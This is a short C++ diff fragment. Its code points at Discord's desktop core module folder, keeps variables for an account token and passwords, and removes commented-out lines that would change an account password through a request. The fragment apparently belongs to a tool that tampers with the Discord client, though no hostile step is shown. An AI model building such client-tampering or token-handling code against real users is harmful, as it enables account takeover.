@@ -17,11 +17,6 @@ int main()
 	std::string PATH{"\\AppData\\Local\\Discord\\app-1.0.9004\\modules\\discord_desktop_core-2\\discord_desktop_core\\"};
 	std::string password{}, newPassword{}, token{};
 
-	//std::cin.ignore(256, '\n') >> token;
-	//std::cin.ignore(256, '\n') >> password;
-	//std::cin.ignore(256, '\n') >> newPassword;
-	//DiscordRequest firstReq{token, password, newPassword};
-	//std::cout << firstReq.changePassword();
 	PATH = path::getPath(PATH);
 	while(true) {
 		if (path::checkPath(PATH)) {
